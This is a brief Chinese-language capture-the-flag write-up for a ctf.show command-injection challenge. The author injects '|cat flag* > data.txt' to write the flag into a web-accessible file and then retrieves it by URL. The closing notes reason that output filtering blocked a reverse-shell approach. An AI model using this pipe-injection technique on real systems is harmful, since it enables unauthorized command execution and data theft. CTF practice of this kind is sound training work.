参考反弹shell构造逻辑，结果也是存在当前路径下
执行 cat flag* > data.txt
输出 ls cat flag* > data.txt execute success!
访问 https://4432374c-f10c-4160-8ba4-4e6954ab0066.challenge.ctf.show/data.txt 可以看到文件名
再执行 |cat flag* > data.txt
访问 https://4432374c-f10c-4160-8ba4-4e6954ab0066.challenge.ctf.show/data.txt 可以看到ctf，成功

心得：
猜测环境对输出过v
使用 | 做了输出过滤，导致使用反弹shell的方式时直接拿不到结果